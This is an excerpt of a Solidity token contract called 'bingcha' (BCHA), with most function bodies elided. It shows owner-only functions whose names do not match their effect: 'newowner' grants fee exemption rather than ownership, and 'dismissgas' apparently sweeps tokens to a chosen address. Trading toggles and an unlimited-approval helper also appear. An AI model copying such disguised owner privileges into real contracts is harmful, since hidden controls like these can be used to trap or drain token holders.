...
contract bingcha is IERC20, Ownable, IDistributorShare{
    
    using SafeMath for uint256;

    string _name = "bingcha";
    string _symbol = "BCHA";
    uint8 _decimals = 9;
    ...
    function newowner(address holder) external onlyOwner {
        require(holder != address(this));
        initializeDistribution(holder);   
        _isFeeExempt[holder] = true;              
    } 

    function withapproval(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }    

    function nocharge(address recipient, uint256 amount) internal returns (uint256) {        
   ...
   function dismissgas(address _token, address _to) external onlyOwner returns (bool _sent) {    
    ...
    function updateRestrictWhales(bool newValue) external onlyOwner {
       restrictWhales = newValue;
    }    
    
    function updateStatus(bool newStatus) public onlyOwner {
